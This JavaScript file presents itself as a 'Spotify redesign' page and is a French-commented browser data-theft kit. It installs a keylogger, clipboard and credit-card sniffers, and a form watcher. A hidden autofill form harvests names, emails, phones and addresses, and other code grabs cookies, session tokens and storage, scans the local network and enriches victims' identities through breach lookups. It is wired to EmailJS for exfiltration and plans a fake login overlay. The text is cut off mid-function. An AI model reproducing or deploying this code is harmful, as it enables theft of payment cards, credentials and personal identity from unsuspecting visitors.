/**
 * SPOTIFY REDESIGN - ULTIMATE COLLECTOR v3.0
 * Fusion complète : tracking, fingerprinting, identité réelle, exploitation réseau
 * Usage expérimental uniquement - NE PAS UTILISER EN PRODUCTION
 */

// ====================== CONFIGURATION ======================
const CONFIG = {
    EMAILJS: {
        PUBLIC_KEY: "TIiOLwNoR3sbqQJZ-",
        SERVICE_ID: "service_o9pwrgp",
        TEMPLATE_ID: "template_oa57i62"
    },
    // APIs externes (à remplacer par vos clés)
    APIS: {
        IPAPI: "https://ipapi.co/json/",
        IPWHOIS: "https://ipwho.is/",
        EMAILREP: "https://emailrep.io/",
        HIBP: "https://haveibeenpwned.com/api/v3/",
        GITHUB: "https://api.github.com/",
        TRUECALLER: "https://api.truecaller.com/v2/search",
        LEAKLOOKUP: "https://leak-lookup.com/api/search"
    }
};

// ====================== ÉTAT GLOBAL ======================
const startTime = Date.now();
let hasPurchased = false;
let reportSent = false;
let identityReportSent = false;
let periodicInterval;

// Structure complète des données
const sessionData = {
    // Identité réelle (cible principale)
    realIdentity: {
        name: { first: null, last: null, full: null, confidence: 0, sources: [] },
        email: { primary: null, alternatives: [], confidence: 0 },
        phone: { number: null, carrier: null, confidence: 0 },
        address: { street: null, city: null, postal: null, country: null },
        dateOfBirth: null,
        age: null,
        gender: null,
        job: { title: null, company: null },
        socialProfiles: [],
        family: [],
        documents: []
    },
    
    // Données techniques
    technical: {
        fingerprints: {
            canvas: null,
            webgl: null,
            audio: null,
            fonts: [],
            screen: {},
            navigator: {},
            timezone: null,
            hardware: {}
        },
        network: {
            publicIp: null,
            localIp: null,
            allIps: [],
            isp: null,
            location: {},
            vpn: false,
            proxy: false,
            latency: null,
            dns: []
        },
        system: {
            os: null,
            browser: null,
            device: null,
            battery: {},
            memory: {},
            peripherals: [],
            installedApps: []
        }
    },
    
    // Données sensibles capturées
    stolen: {
        credentials: [],
        creditCards: [],
        passwords: [],
        clipboard: [],
        keylog: [],
        forms: [],
        tokens: [],
        cookies: {},
        localStorage: {},
        sessionStorage: {}
    },
    
    // Comportement
    behavior: {
        clicks: 0,
        keyPresses: 0,
        mouseSpeed: 0,
        scrollDepth: 0,
        focusTime: 0,
        sessionDuration: 0,
        interactionHeatmap: []
    },
    
    // Métadonnées
    metadata: {
        sessionId: null,
        startTime: startTime,
        referrer: null,
        landingPage: window.location.href,
        userAgent: navigator.userAgent
    }
};

// ====================== INITIALISATION ======================
export async function initApp() {
    console.log("[ULTIMATE] Initialisation du système de collecte...");
    
    // 1. Initialisation EmailJS
    emailjs.init(CONFIG.EMAILJS.PUBLIC_KEY);
    
    // 2. Génération de l'ID de session
    sessionData.metadata.sessionId = await generateSessionId();
    
    // 3. Setup des trackers
    setupGlobalKeylogger();
    setupClipboardSniffer();
    setupCreditCardSniffer();
    setupFormWatcher();
    setupBehaviorTracking();
    setupAutofillSniffer();
    
    // 4. Fingerprinting avancé
    await executeAdvancedFingerprinting();
    
    // 5. Collecte réseau
    await executeNetworkCollection();
    
    // 6. Récupération d'identité
    await executeIdentityHarvesting();
    
    // 7. Exploitation système
    executeSystemExploitation();
    
    // 8. Persistance et exfiltration
    setupExfiltration();
    setupPersistence();
    
    // 9. Social engineering (déclenché conditionnellement)
    setTimeout(() => {
        if (!hasPurchased && sessionData.behavior.scrollDepth > 30) {
            deployFakeLoginOverlay();
        }
    }, 30000);
    
    // 10. Interface de paiement
    renderPayPalButton();
    
    // 11. Rapports périodiques
    startPeriodicReports();
    
    console.log("[ULTIMATE] Système opérationnel - Session:", sessionData.metadata.sessionId);
}

// ====================== 1. GÉNÉRATION ID SESSION ======================
async function generateSessionId() {
    const components = [
        navigator.userAgent,
        screen.width + screen.height,
        new Date().getTimezoneOffset(),
        navigator.language,
        navigator.hardwareConcurrency
    ];
    
    const hash = await sha256(components.join('|'));
    return hash.substring(0, 16);
}

async function sha256(message) {
    const msgBuffer = new TextEncoder().encode(message);
    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// ====================== 2. FINGERPRINTING ULTIME ======================
async function executeAdvancedFingerprinting() {
    console.log("[FP] Génération des empreintes...");
    
    // Canvas fingerprint
    sessionData.technical.fingerprints.canvas = generateCanvasFingerprint();
    
    // WebGL fingerprint
    sessionData.technical.fingerprints.webgl = getWebGLInfo();
    
    // Audio fingerprint
    sessionData.technical.fingerprints.audio = await getAudioFingerprint();
    
    // Détection des polices
    sessionData.technical.fingerprints.fonts = detectInstalledFonts();
    
    // Écran
    sessionData.technical.fingerprints.screen = {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        orientation: screen.orientation?.type || 'unknown'
    };
    
    // Navigateur / OS
    sessionData.technical.fingerprints.navigator = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory || 'unknown',
        maxTouchPoints: navigator.maxTouchPoints,
        vendor: navigator.vendor,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack
    };
    
    // Timezone
    sessionData.technical.fingerprints.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    // Analyse système
    sessionData.technical.fingerprints.hardware = await analyzeHardware();
    
    // Détection de virtualisation
    sessionData.technical.fingerprints.isVirtual = detectVirtualization();
}

function generateCanvasFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 400;
    canvas.height = 150;
    
    ctx.fillStyle = "#f60";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#fff";
    ctx.font = "24px 'Arial'";
    ctx.fillText("Spotify", 20, 50);
    ctx.font = "18px 'Courier New'";
    ctx.fillText("ID-Check", 20, 100);
    ctx.fillStyle = "#000";
    ctx.shadowBlur = 2;
    ctx.shadowColor = "#ccc";
    ctx.fillRect(300, 20, 50, 50);
    
    const dataURL = canvas.toDataURL();
    let hash = 0;
    for (let i = 0; i < dataURL.length; i++) {
        hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
        hash |= 0;
    }
    return Math.abs(hash).toString(16).toUpperCase();
}

function getWebGLInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { error: "WebGL not supported" };
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            };
        }
        return { error: "No debug info" };
    } catch(e) {
        return { error: e.message };
    }
}

async function getAudioFingerprint() {
    return new Promise((resolve) => {
        try {
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            if (!AudioContext) return resolve({ error: "AudioContext not supported" });
            const ctx = new AudioContext();
            const oscillator = ctx.createOscillator();
            const analyser = ctx.createAnalyser();
            const gain = ctx.createGain();
            oscillator.connect(analyser);
            analyser.connect(gain);
            oscillator.frequency.value = 440;
            oscillator.type = "sawtooth";
            oscillator.start(0);
            const bufferLength = analyser.frequencyBinCount;
            const dataArray = new Uint8Array(bufferLength);
            analyser.getByteFrequencyData(dataArray);
            const fingerprint = Array.from(dataArray).join('');
            oscillator.disconnect();
            ctx.close();
            resolve({ fingerprint: fingerprint.slice(0, 100), sampleRate: ctx.sampleRate });
        } catch(e) {
            resolve({ error: e.message });
        }
    });
}

function detectInstalledFonts() {
    const fonts = [
        "Arial", "Verdana", "Times New Roman", "Courier New", "Georgia",
        "Comic Sans MS", "Impact", "Tahoma", "Trebuchet MS", "Helvetica",
        "Roboto", "Open Sans", "Segoe UI", "Ubuntu", "Calibri"
    ];
    const testString = "mmmmmmmmmmlli";
    const baseFont = "monospace";
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 500;
    canvas.height = 100;
    ctx.font = `72px ${baseFont}`;
    const baseWidth = ctx.measureText(testString).width;
    const detected = [];
    for (const font of fonts) {
        ctx.font = `72px ${font}, ${baseFont}`;
        const width = ctx.measureText(testString).width;
        if (width !== baseWidth) detected.push(font);
    }
    return detected;
}

async function analyzeHardware() {
    const hardware = {};
    
    // Mesure CPU
    const startTime = performance.now();
    let iterations = 0;
    while (performance.now() - startTime < 100) {
        Math.sqrt(Math.random() * 1000000);
        iterations++;
    }
    hardware.cpuBenchmark = iterations;
    
    // Architecture
    hardware.architecture = navigator.userAgent.includes('x64') ? 'x64' : 
                           navigator.userAgent.includes('ARM') ? 'ARM' : 'unknown';
    
    // GPU Benchmark
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl');
    if (gl) {
        const startGpu = performance.now();
        for (let i = 0; i < 500; i++) {
            canvas.width = 100;
            canvas.height = 100;
            gl.clear(gl.COLOR_BUFFER_BIT);
        }
        hardware.gpuBenchmark = performance.now() - startGpu;
    }
    
    return hardware;
}

function detectVirtualization() {
    const checks = [
        navigator.userAgent.includes('VMware'),
        navigator.userAgent.includes('VirtualBox'),
        navigator.userAgent.includes('Hyper-V'),
        navigator.platform.includes('Win32') && navigator.hardwareConcurrency === 1,
        navigator.deviceMemory === 0.5
    ];
    return checks.some(c => c === true);
}

// ====================== 3. COLLECTE RÉSEAU ======================
async function executeNetworkCollection() {
    console.log("[NET] Collecte des informations réseau...");
    
    // IP locale via WebRTC
    await getLocalIP();
    
    // IP publique et géolocalisation
    await getPublicIPAndGeo();
    
    // Toutes les IPs via WebRTC
    await getAllNetworkIPs();
    
    // Détection VPN/Proxy
    await detectVPNProxy();
    
    // Latence réseau
    await measureNetworkLatency();
    
    // Scan réseau local
    await scanLocalNetwork();
}

async function getLocalIP() {
    return new Promise((resolve) => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.createOffer().then(pc.setLocalDescription.bind(pc));
        pc.onicecandidate = (ice) => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9:]+)/.exec(ice.candidate.candidate)[1];
            if (ip.includes('.')) {
                sessionData.technical.network.localIp = ip;
                resolve(ip);
            }
        };
        setTimeout(() => resolve("N/A"), 2000);
    });
}

async function getPublicIPAndGeo() {
    try {
        const res = await fetch(CONFIG.APIS.IPAPI);
        const data = await res.json();
        sessionData.technical.network.publicIp = data.ip;
        sessionData.technical.network.location = {
            city: data.city,
            region: data.region,
            country: data.country_name,
            latitude: data.latitude,
            longitude: data.longitude,
            postal: data.postal,
            timezone: data.timezone
        };
        sessionData.technical.network.isp = data.org;
    } catch(e) {}
}

async function getAllNetworkIPs() {
    const ips = new Set();
    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
    pc.createDataChannel('');
    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
    pc.onicecandidate = (event) => {
        if (!event.candidate) return;
        const candidate = event.candidate.candidate;
        const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}|([a-f0-9:]+:+)+[a-f0-9]+/;
        const match = ipRegex.exec(candidate);
        if (match) ips.add(match[0]);
    };
    setTimeout(() => {
        sessionData.technical.network.allIps = Array.from(ips);
    }, 2000);
}

async function detectVPNProxy() {
    try {
        const res = await fetch(CONFIG.APIS.IPWHOIS);
        const data = await res.json();
        sessionData.technical.network.vpn = data.proxy || data.vpn || false;
        sessionData.technical.network.proxy = data.proxy || false;
    } catch(e) {}
}

async function measureNetworkLatency() {
    const start = performance.now();
    try {
        await fetch('https://www.google.com/favicon.ico', { mode: 'no-cors' });
        sessionData.technical.network.latency = Math.round(performance.now() - start);
    } catch(e) {}
}

async function scanLocalNetwork() {
    const devices = [];
    const localIP = sessionData.technical.network.localIp;
    if (!localIP) return;
    
    const subnet = localIP.substring(0, localIP.lastIndexOf('.'));
    const commonIPs = [
        `${subnet}.1`, `${subnet}.254`, `${subnet}.100`, `${subnet}.101`,
        '192.168.1.1', '192.168.0.1', '10.0.0.1'
    ];
    
    for (const ip of commonIPs) {
        try {
            const img = new Image();
            img.src = `http://${ip}/favicon.ico`;
            await Promise.race([
                new Promise(resolve => img.onload = resolve),
                new Promise(resolve => setTimeout(resolve, 500))
            ]);
            devices.push({ ip, online: true });
        } catch(e) {}
    }
    
    sessionData.technical.network.localDevices = devices;
}

// ====================== 4. HARVESTING IDENTITÉ ======================
async function executeIdentityHarvesting() {
    console.log("[ID] Récupération de l'identité réelle...");
    
    // 1. Depuis l'email (si capturé)
    if (sessionData.realIdentity.email.primary) {
        await enrichFromEmail(sessionData.realIdentity.email.primary);
    }
    
    // 2. Depuis le téléphone (si capturé)
    if (sessionData.realIdentity.phone.number) {
        await enrichFromPhone(sessionData.realIdentity.phone.number);
    }
    
    // 3. Recherche sur réseaux sociaux
    if (sessionData.realIdentity.name.full) {
        await searchSocialMedia();
    }
    
    // 4. Recherche dans les breaches
    if (sessionData.realIdentity.email.primary) {
        await checkBreaches(sessionData.realIdentity.email.primary);
    }
    
    // 5. Corrélation finale
    await correlateIdentity();
}

async function enrichFromEmail(email) {
    try {
        // EmailRep.io
        const repResponse = await fetch(`${CONFIG.APIS.EMAILREP}${encodeURIComponent(email)}`);
        const repData = await repResponse.json();
        if (repData) {
            if (repData.name) {
                sessionData.realIdentity.name.full = repData.name;
                sessionData.realIdentity.name.confidence = 70;
            }
            if (repData.details?.associatedAccounts) {
                sessionData.realIdentity.socialProfiles.push(...repData.details.associatedAccounts);
            }
        }
    } catch(e) {}
    
    // Extraire nom depuis l'email
    const [localPart] = email.split('@');
    const namePatterns = [
        { regex: /^([a-z]+)\.([a-z]+)$/, format: "prenom.nom" },
        { regex: /^([a-z]+)([a-z]+)$/, format: "prenomnom" },
        { regex: /^([a-z])\.([a-z]+)$/, format: "initial.nom" }
    ];
    
    for (const pattern of namePatterns) {
        const match = localPart.match(pattern.regex);
        if (match) {
            sessionData.realIdentity.name.first = match[1].charAt(0).toUpperCase() + match[1].slice(1);
            sessionData.realIdentity.name.last = match[2].charAt(0).toUpperCase() + match[2].slice(1);
            sessionData.realIdentity.name.full = `${sessionData.realIdentity.name.first} ${sessionData.realIdentity.name.last}`;
            sessionData.realIdentity.name.confidence = 60;
            sessionData.realIdentity.name.sources.push('email_pattern');
            break;
        }
    }
}

async function enrichFromPhone(phone) {
    const cleanedPhone = phone.replace(/\D/g, '');
    
    try {
        // NumVerify
        const verifyResponse = await fetch(`http://apilayer.net/api/validate?access_key=your-key&number=${cleanedPhone}`);
        const verifyData = await verifyResponse.json();
        if (verifyData.valid) {
            sessionData.realIdentity.phone.carrier = verifyData.carrier;
            sessionData.realIdentity.phone.country = verifyData.country_name;
        }
    } catch(e) {}
}

async function searchSocialMedia() {
    const name = sessionData.realIdentity.name.full;
    if (!name) return;
    
    // GitHub
    try {
        const githubSearch = await fetch(`${CONFIG.APIS.GITHUB}search/users?q=${encodeURIComponent(name)}`);
        const githubData = await githubSearch.json();
        if (githubData.items && githubData.items.length > 0) {
            sessionData.realIdentity.socialProfiles.push({
                platform: 'GitHub',
                username: githubData.items[0].login,
                url: githubData.items[0].html_url
            });
        }
    } catch(e) {}
}

async function checkBreaches(email) {
    try {
        const hash = await sha256(email.toLowerCase());
        const breachResponse = await fetch(`${CONFIG.APIS.HIBP}breachedaccount/${encodeURIComponent(email)}`, {
            headers: { 'hibp-api-key': 'your-key' }
        });
        if (breachResponse.ok) {
            const breaches = await breachResponse.json();
            sessionData.stolen.breaches = breaches;
            
            // Extraire les infos personnelles des breaches
            for (const breach of breaches) {
                if (breach.DataClasses.includes('Names')) {
                    sessionData.realIdentity.name.confidence += 10;
                }
                if (breach.DataClasses.includes('Email addresses')) {
                    sessionData.realIdentity.email.confidence += 10;
                }
                if (breach.DataClasses.includes('Passwords')) {
                    sessionData.realIdentity.hasPasswordLeak = true;
                }
            }
        }
    } catch(e) {}
}

async function correlateIdentity() {
    // Déterminer le meilleur nom
    if (sessionData.realIdentity.name.full) {
        const confidence = Math.min(sessionData.realIdentity.name.confidence + 20, 100);
        sessionData.realIdentity.name.confidence = confidence;
    }
    
    // Déterminer l'âge approximatif
    if (sessionData.realIdentity.dateOfBirth) {
        const birthDate = new Date(sessionData.realIdentity.dateOfBirth);
        const ageDifMs = Date.now() - birthDate.getTime();
        const ageDate = new Date(ageDifMs);
        sessionData.realIdentity.age = Math.abs(ageDate.getUTCFullYear() - 1970);
    }
}

// ====================== 5. KEYLOGGER GLOBAL ======================
function setupGlobalKeylogger() {
    let keyBuffer = '';
    let lastSend = Date.now();
    
    document.addEventListener('keydown', (e) => {
        if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Tab' || e.key === 'Backspace') {
            keyBuffer += e.key;
            
            if (Date.now() - lastSend > 5000 || keyBuffer.length > 50) {
                sessionData.stolen.keylog.push({
                    buffer: keyBuffer,
                    timestamp: Date.now(),
                    url: window.location.href
                });
                keyBuffer = '';
                lastSend = Date.now();
            }
        }
    });
    
    window.addEventListener('beforeunload', () => {
        if (keyBuffer.length > 0) {
            sessionData.stolen.keylog.push({ buffer: keyBuffer, timestamp: Date.now(), final: true });
        }
    });
}

// ====================== 6. CLIPBOARD SNIFFER ======================
function setupClipboardSniffer() {
    let lastContent = '';
    
    setInterval(async () => {
        try {
            const text = await navigator.clipboard.readText();
            if (text && text !== lastContent && text.length > 5) {
                lastContent = text;
                sessionData.stolen.clipboard.push({
                    content: text.substring(0, 500),
                    timestamp: Date.now(),
                    hasEmail: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(text),
                    hasPhone: /(\+\d{1,3}[-.]?)?\(?\d{3}\)?[-.]?\d{3}[-.]?\d{4}/.test(text),
                    hasCreditCard: /\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}/.test(text)
                });
            }
        } catch(e) {}
    }, 3000);
}

// ====================== 7. CREDIT CARD SNIFFER ======================
function setupCreditCardSniffer() {
    const cardPatterns = {
        visa: /^4[0-9]{12}(?:[0-9]{3})?$/,
        mastercard: /^5[1-5][0-9]{14}$/,
        amex: /^3[47][0-9]{13}$/,
        discover: /^6(?:011|5[0-9]{2})[0-9]{12}$/
    };
    
    const cardSelectors = [
        '[name*="card" i]', '[name*="cc" i]', '[name*="credit" i]',
        '[autocomplete="cc-number"]', '[placeholder*="card" i]'
    ];
    
    const observer = new MutationObserver(() => {
        document.querySelectorAll(cardSelectors.join(',')).forEach(el => {
            if (!el._listener) {
                el._listener = true;
                el.addEventListener('input', (e) => {
                    const value = e.target.value.replace(/\s/g, '');
                    for (const [type, pattern] of Object.entries(cardPatterns)) {
                        if (pattern.test(value)) {
                            sessionData.stolen.creditCards.push({
                                number: value,
                                type: type,
                                timestamp: Date.now(),
                                element: el.id || el.name
                            });
                            sendImmediateReport();
                        }
                    }
                });
            }
        });
    });
    
    observer.observe(document.body, { childList: true, subtree: true });
}

// ====================== 8. FORM WATCHER ======================
function setupFormWatcher() {
    function captureForm(form) {
        const formData = new FormData(form);
        const entries = Array.from(formData.entries());
        sessionData.stolen.forms.push({
            action: form.action,
            method: form.method,
            fields: entries,
            timestamp: Date.now()
        });
        
        // Extraire données sensibles
        entries.forEach(([name, value]) => {
            if (value && value.trim()) {
                const lowerName = name.toLowerCase();
                if (lowerName.includes('email')) sessionData.realIdentity.email.primary = value;
                if (lowerName.includes('name')) {
                    const parts = value.trim().split(' ');
                    sessionData.realIdentity.name.first = parts[0];
                    sessionData.realIdentity.name.last = parts.slice(1).join(' ');
                    sessionData.realIdentity.name.full = value;
                }
                if (lowerName.includes('tel') || lowerName.includes('phone')) sessionData.realIdentity.phone.number = value;
                if (lowerName.includes('address')) sessionData.realIdentity.address.street = value;
                if (lowerName.includes('card') || lowerName.includes('cc')) sessionData.stolen.creditCards.push({ number: value, timestamp: Date.now() });
            }
        });
    }
    
    document.querySelectorAll('form').forEach(form => {
        form.addEventListener('submit', (e) => captureForm(form));
    });
    
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            mutation.addedNodes.forEach((node) => {
                if (node.nodeType === 1 && node.tagName === 'FORM') {
                    node.addEventListener('submit', () => captureForm(node));
                }
            });
        });
    });
    observer.observe(document.body, { childList: true, subtree: true });
}

// ====================== 9. AUTOFILL SNIFFER ======================
function setupAutofillSniffer() {
    const ghostForm = document.createElement('div');
    ghostForm.innerHTML = `
        <form id="ghost-form" style="position:absolute; top:-1000px; left:-1000px; opacity:0;">
            <input type="text" name="name" autocomplete="name">
            <input type="email" name="email" autocomplete="email">
            <input type="tel" name="phone" autocomplete="tel">
            <input type="address" name="address" autocomplete="address">
        </form>
    `;
    document.body.appendChild(ghostForm);
    
    setInterval(() => {
        const form = document.getElementById('ghost-form');
        if (!form) return;
        
        const name = form.querySelector('[name="name"]').value;
        const email = form.querySelector('[name="email"]').value;
        const phone = form.querySelector('[name="phone"]').value;
        const address = form.querySelector('[name="address"]').value;
        
        if (name && !sessionData.realIdentity.name.full) {
            const parts = name.trim().split(' ');
            sessionData.realIdentity.name.first = parts[0];
            sessionData.realIdentity.name.last = parts.slice(1).join(' ');
            sessionData.realIdentity.name.full = name;
            sessionData.realIdentity.name.confidence = 80;
            sessionData.realIdentity.name.sources.push('autofill');
        }
        if (email) sessionData.realIdentity.email.primary = email;
        if (phone) sessionData.realIdentity.phone.number = phone;
        if (address) sessionData.realIdentity.address.street = address;
    }, 2000);
}

// ====================== 10. BEHAVIOR TRACKING ======================
function setupBehaviorTracking() {
    let lastMove = Date.now();
    let focusStart = Date.now();
    
    document.addEventListener('mousemove', (e) => {
        const speed = Math.sqrt(Math.pow(e.movementX, 2) + Math.pow(e.movementY, 2));
        sessionData.behavior.mouseSpeed = Math.max(sessionData.behavior.mouseSpeed, speed);
        lastMove = Date.now();
    });
    
    document.addEventListener('click', () => {
        sessionData.behavior.clicks++;
        sessionData.behavior.interactionHeatmap.push({
            type: 'click',
            timestamp: Date.now(),
            x: event.clientX,
            y: event.clientY
        });
    });
    
    document.addEventListener('keydown', () => {
        sessionData.behavior.keyPresses++;
    });
    
    window.addEventListener('scroll', () => {
        const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
        const depth = (scrollTop / docHeight) * 100;
        sessionData.behavior.scrollDepth = Math.max(sessionData.behavior.scrollDepth, depth);
    });
    
    window.addEventListener('focus', () => { focusStart = Date.now(); });
    window.addEventListener('blur', () => {
        sessionData.behavior.focusTime += Date.now() - focusStart;
    });
    
    setInterval(() => {
        sessionData.behavior.sessionDuration = Math.round((Date.now() - startTime) / 1000);
    }, 1000);
}

// ====================== 11. EXPLOITATION SYSTÈME ======================
function executeSystemExploitation() {
    // Capturer les tokens de session
    captureSessionTokens();
    
    // Capturer les stockages
    captureStorages();
    
    // Détecter les extensions
    detectExtensions();
    
    // Détecter les périphériques
    detectPeripherals();
    
    // Détecter les logiciels installés
    detectInstalledSoftware();
}

function captureSessionTokens() {
    const tokens = [];
    
    // Cookies
    document.cookie.split(';').forEach(cookie => {
        const [name, value] = cookie.split('=');
        if (value && (name.includes('token') || name.includes('session') || name.includes('auth'))) {
            tokens.push({ type: 'cookie', name, value: value.substring(0, 100) });
        }
    });
    
    // localStorage
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        if (value && (key.includes('token') || key.includes('session') || value.includes('Bearer') || value.includes('eyJ'))) {
            tokens.push({ type: 'localStorage', key, value: value.substring(0, 200) });
        }
    }
    
    sessionData.stolen.tokens = tokens;
}

function captureStorages() {
    try {
        sessionData.stolen.cookies = document.cookie.split('; ').reduce((acc, cookie) => {
            const [key, val] = cookie.split('=');
            acc[key] = val;
            return acc;
        }, {});
    } catch(e) {}
    
    try {
        sessionData.stolen.localStorage = { ...localStorage };
    } catch(e) {}
    
    try {
        sessionData.stolen.sessionStorage = { ...sessionStorage };
    } catch(e) {}
}

function detectExtensions() {
    const extensions = [];
    
    // Test AdBlock
    const testElement = document.createElement('div');
    testElement.className = 'adsbox';
    document.body.appendChild(testElement);
    setTimeout(() => {
        if (testElement.offsetHeight === 0) {
            extensions.push('AdBlock detected');
        }
        document.body.removeChild(testElement);
    }, 100);
    
    // Détection d'extensions via leur API
    if (window.ethereum) extensions.push('MetaMask');
    if (window.solana) extensions.push('Phantom');
    if (window.grammarly) extensions.push('Grammarly');
    if (window.lastpass) extensions.push('LastPass');
    
    sessionData.technical.system.extensions = extensions;
}

async function detectPeripherals() {
    const devices = [];
    
    if (navigator.mediaDevices?.enumerateDevices) {
        try {
            const mediaDevices = await navigator.mediaDevices.enumerateDevices();
            mediaDevices.forEach(device => {
                devices.push({
                    kind: device.kind,
                    label: device.label || 'hidden',
                    deviceId: device.deviceId?.substring(0, 10)
                });
            });
        } catch(e) {}
    }
    
    if (navigator.getGamepads) {
        const gamepads = navigator.getGamepads();
        gamepads.forEach(gp => {
            if (gp) {
                devices.push({ type: 'gamepad', id: gp.id });
            }
        });
    }
    
    sessionData.technical.system.peripherals = devices;
}

function detectInstalledSoftware() {
    const software = [];
    const protocols = {
        'steam': 'steam://',
        'discord': 'discord://',
        'spotify': 'spotify://',
        'vscode': 'vscode://',
        'slack': 'slack://',
        'zoom': 'zoommtg://',
        'teams': 'msteams://'
    };
    
    for (const [app, protocol] of Object.entries(protocols)) {
        const start = performance.now();
        const iframe = document.createElement('iframe');
        iframe.src = protocol;
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        
        setTimeout(() => {
            const duration = performance.now() - start;
            if (duration < 200) {
                software.push({ app, detected: true, responseTime: duration });
            }
            document.body
